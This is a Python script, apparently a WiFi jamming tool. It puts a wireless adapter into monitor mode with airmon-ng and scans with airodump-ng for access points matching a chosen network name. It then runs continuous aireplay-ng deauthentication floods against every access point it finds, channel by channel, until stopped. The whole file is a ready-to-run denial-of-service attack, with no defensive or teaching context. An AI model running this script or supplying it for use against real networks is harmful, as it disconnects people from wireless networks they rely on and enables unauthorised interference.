import os
import shutil
import datetime
import csv
import time
import subprocess
import re
from datetime import datetime

GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
CYAN = "\033[36m"
RESET = "\033[0m"  # Réinitialise la couleur

wlan_pattern = re.compile("^wlan[0-9]+")
wifi_name= ""
active_wireless_networks = []
network_id = []

for file_name in os.listdir():
    # We should only have one csv file as we delete them from the folder every time we run the program.
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
        # We get the current working directory.
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        # Create a timestamp
        timestamp = datetime.now()
        # We copy any .csv files in the folder to the backup folder.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# If the user doesn't run the program with super user privileges, don't allow them to continue.
if not 'SUDO_UID' in os.environ.keys():
    print(f"{RED}Try running this program with sudo.{RESET}")
    exit()

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
if len(check_wifi_result) == 0:
    print(f"{YELLOW}Please connect a WiFi controller and try again.{RESET}")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print(f"{RED}Please enter a number that corresponds with the choices.{RESET}")

wlan_interface = check_wifi_result[int(wifi_interface_choice)]      # name of the wifi interface

print(f"{GREEN}WiFi adapter connected!\nNow let's kill conflicting processes:{RESET}")
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])  # kill process
time.sleep(1)
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", wlan_interface])
time.sleep(1)
wifi_name = input("\nEnter the wifi name (ESSID) : ")

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","--essid", wifi_name,"--band", "abg", "-w" ,"file","--write-interval", "1","--output-format", "csv", wlan_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(1)

def start_deauth():
    processes = []
    channel = ""
    network_id.sort(key=lambda x: int(x[1]))
    try:
        while True:
            for a in network_id:
                if channel != a[1]:
                    #time.sleep(2)
                    channel = a[1] 
                    subprocess.run(["airmon-ng", "start", wlan_interface, channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Starting monitor mode on specific channel
                process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", a[0], wlan_interface],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        # Start deauth 
                processes.append(process)
                print("Deauth ", a[0], " on the channel ", a[1])
                #time.sleep(0.5)
        

    except KeyboardInterrupt:
        for process in processes:
            process.terminate()
        print("Done.")
        return

def check_for_bssid(bssid, lst):
    check_status = True

    # If no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if bssid in item["BSSID"]:
            check_status = False

    return check_status

try:
    
    while True:
        subprocess.run("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                    with open(file_name) as csv_h:
                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                            # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                    break
                            elif check_for_bssid(row["BSSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)
        print("CTRL-C when you want to start the attack")
        network_id = []
        for index, item in enumerate(active_wireless_networks):
        #    if item["ESSID"].strip() == wifi_name:
            network_id.append([item["BSSID"].strip(), item["channel"].strip()])
        if len(network_id) == 0:
            print(f"{RED}Wifi name not found!{RESET}")
        else:
            print(f"{GREEN}{len(network_id)} Acces Point discovered! {RESET}")
        print("      BSSID         Ch")
        for net in network_id:
            print(f"{net[0]}   {net[1]}")     
        time.sleep(0.5)

except KeyboardInterrupt:
    discover_access_points.terminate()
    print("\nStarting", end="", flush=True)
    for i in range(3):
        time.sleep(1)
        print(".", end="", flush=True)


print("\nPress CTRL-C to stop the attack")
start_deauth()     # Start attack

print("exit")

exit()